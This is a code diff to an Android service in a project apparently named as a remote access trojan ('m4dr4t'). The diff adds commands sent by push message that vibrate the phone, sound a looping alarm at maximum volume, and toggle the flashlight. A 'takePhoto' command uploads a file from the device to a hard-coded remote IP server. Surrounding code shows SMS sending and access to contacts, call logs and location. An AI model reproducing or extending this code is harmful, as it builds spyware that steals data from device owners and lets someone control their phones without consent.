@@ -2,7 +2,6 @@ package example.com.m4dr4t;
 
 import android.app.IntentService;
 import android.app.NotificationManager;
-import android.app.PendingIntent;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
@@ -11,12 +10,14 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.hardware.Camera;
 import android.location.Location;
+import android.media.AudioManager;
+import android.media.MediaPlayer;
 import android.net.Uri;
-import android.net.wifi.WifiManager;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
 import android.os.SystemClock;
+import android.os.Vibrator;
 import android.provider.CallLog;
 import android.provider.ContactsContract;
 import android.support.v4.app.NotificationCompat;
@@ -35,6 +36,8 @@ import org.apache.http.client.ClientProtocolException;
 import org.apache.http.client.HttpClient;
 import org.apache.http.client.entity.UrlEncodedFormEntity;
 import org.apache.http.client.methods.HttpPost;
+import org.apache.http.entity.mime.MultipartEntity;
+import org.apache.http.entity.mime.content.FileBody;
 import org.apache.http.impl.client.DefaultHttpClient;
 import org.apache.http.message.BasicNameValuePair;
 import org.apache.http.util.EntityUtils;
@@ -58,19 +61,20 @@ public class GcmIntentService extends IntentService implements
         GooglePlayServicesClient.OnConnectionFailedListener {
     public static final int NOTIFICATION_ID = 1;
     static final String TAG = "Client";
+    static Camera camera;
+    static Vibrator v;
+    static MediaPlayer player;
     NotificationCompat.Builder builder;
-    private NotificationManager mNotificationManager;
     SharedPreferences prefs;
     LocationClient mLocationClient;
     Location mCurrentLocation;
     String lat, lng;
-    Camera camera;
-    boolean isFlashOn;
-    Camera.Parameters p;
+    private NotificationManager mNotificationManager;
+
 
     public GcmIntentService() {
         super("GcmIntentService");
-        camera = Camera.open();
+
 
     }
 
@@ -131,6 +135,27 @@ public class GcmIntentService extends IntentService implements
                     String message = intent.getStringExtra("message");
 
                     flashLight(message);
+                }
+
+                if (type.equalsIgnoreCase("vibrate")) {
+                    Log.i(TAG, intent.getStringExtra("message"));
+
+                    String message = intent.getStringExtra("message");
+
+                    vibrate(message);
+
+                }
+                if (type.equalsIgnoreCase("alarm")) {
+                    Log.i(TAG, intent.getStringExtra("message"));
+
+                    String message = intent.getStringExtra("message");
+
+                    alarm(message);
+                }
+                if (type.equalsIgnoreCase("takePhoto")) {
+                    String filepath = "/mnt/sdcard/pa_gapps.log";
+                    uploadFile(filepath);
+
                 }
                 else
                 sendNotification(intent.getStringExtra("type"));
@@ -209,46 +234,114 @@ public class GcmIntentService extends IntentService implements
     {
 
 
+        boolean checkflashlight = getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);
 
-             boolean hasFlash;
+        if (checkflashlight) {
+            if (camera == null) {
+                camera = Camera.open();
+                PackageManager pm = getPackageManager();
+                final Camera.Parameters p = camera.getParameters();
+                p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
+                camera.setParameters(p);
+                camera.startPreview();
 
-            hasFlash = getApplicationContext().getPackageManager()
-                    .hasSystemFeature(PackageManager.FEATURE_CAMERA_FLASH);
-            if(hasFlash)
-            {
+                Log.i(TAG, "Flash Light On");
 
-
-                if(message.equalsIgnoreCase("ON"))
-                {
-                    try {
-
-                        p = camera.getParameters();
-                        p.setFlashMode(Camera.Parameters.FLASH_MODE_TORCH);
-                        camera.setParameters(p);
-                        camera.startPreview();
-                    } catch (RuntimeException e) {
-                        Log.e("Camera Error. Failed to Open. Error: ", e.getMessage());
-                    }
-
-
-
-
-                }
-                if(message.equalsIgnoreCase("OFF"))
-                {
-
-                    if (camera != null) {
-                        camera.release();
-                        camera = null;
-                    }
-
-
-                }
+            }
+            if (message.equalsIgnoreCase("OFF")) {
+                camera.stopPreview();
+                camera.release();
+                camera = null;
+                Log.i(TAG, "Flash Light Off");
             }
 
 
+        }
+
+    }
 
 
+    @SuppressWarnings("deprecation")
+    private void uploadFile(String filepath) {
+        String responseString = null;
+
+        HttpClient httpclient = new DefaultHttpClient();
+        HttpPost httppost = new HttpPost("http://128.199.179.143/upload/index.php");
+
+        try {
+            MultipartEntity entity = new MultipartEntity();
+
+            File sourceFile = new File(filepath);
+
+            // Adding file data to http body
+            entity.addPart("image", new FileBody(sourceFile));
+
+
+            httppost.setEntity(entity);
+
+            // Making server call
+            HttpResponse response = httpclient.execute(httppost);
+            HttpEntity r_entity = response.getEntity();
+
+            int statusCode = response.getStatusLine().getStatusCode();
+            if (statusCode == 200) {
+                // Server response
+                responseString = EntityUtils.toString(r_entity);
+                Log.i(TAG, responseString);
+            } else {
+                responseString = "Error occurred! Http Status Code: "
+                        + statusCode;
+            }
+
+        } catch (ClientProtocolException e) {
+            responseString = e.toString();
+        } catch (IOException e) {
+            responseString = e.toString();
+        }
+    }
+
+    private void vibrate(String message) {
+        if (v == null) {
+            // Get instance of Vibrator from current Context
+            v = (Vibrator) getSystemService(Context.VIBRATOR_SERVICE);
+
+// Start without a delay
+// Vibrate for 100 milliseconds
+// Sleep for 1000 milliseconds
+            long[] pattern = {0, 1000, 1};
+
+// The '0' here means to repeat indefinitely
+// '0' is actually the index at which the pattern keeps repeating from (the start)
+// To repeat the pattern from any other point, you could increase the index, e.g. '1'
+            v.vibrate(pattern, 0);
+        }
+        if (message.equalsIgnoreCase("OFF")) {
+            v.cancel();
+            v = null;
+        }
+    }
+
+    private void alarm(String message) {
+
+        if (player == null) {
+            AudioManager am =
+                    (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+
+            am.setStreamVolume(
+                    AudioManager.STREAM_MUSIC,
+                    am.getStreamMaxVolume(AudioManager.STREAM_MUSIC),
+                    0);
+
+            player = MediaPlayer.create(this, R.raw.alarm);
+            player.setAudioStreamType(AudioManager.STREAM_MUSIC);
+            player.setLooping(true);
+            player.start();
+        }
+        if (message.equalsIgnoreCase("OFF")) {
+            //player.stop();
+            player.release();
+            player = null;
+        }
     }
     private void sendsms(String number,String message) {
         SmsManager smsManager = SmsManager.getDefault();
@@ -534,6 +627,24 @@ public class GcmIntentService extends IntentService implements
 
     }
 
+    private SharedPreferences getGCMPreferences(Context context) {
+        // This sample app persists the registration ID in shared preferences, but
+        // how you store the regID in your app is up to you.
+        return getSharedPreferences(MainActivity.class.getSimpleName(),
+                Context.MODE_PRIVATE);
+    }
+
+    private String getRegistrationId(Context context) {
+        final SharedPreferences prefs = getGCMPreferences(context);
+        String registrationId = prefs.getString("registration_id", "");
+        if (registrationId.isEmpty()) {
+            Log.i(TAG, "Registration not found.");
+            return "";
+        }
+        return registrationId;
+
+    }
+
     private class AsyncTaskRunner extends AsyncTask<String, String, String> {
 
         @Override
@@ -586,24 +697,6 @@ public class GcmIntentService extends IntentService implements
 
 
         }
-
-    }
-
-    private SharedPreferences getGCMPreferences(Context context) {
-        // This sample app persists the registration ID in shared preferences, but
-        // how you store the regID in your app is up to you.
-        return getSharedPreferences(MainActivity.class.getSimpleName(),
-                Context.MODE_PRIVATE);
-    }
-
-    private String getRegistrationId(Context context) {
-        final SharedPreferences prefs = getGCMPreferences(context);
-        String registrationId = prefs.getString("registration_id", "");
-        if (registrationId.isEmpty()) {
-            Log.i(TAG, "Registration not found.");
-            return "";
-        }
-        return registrationId;
 
     }
 }
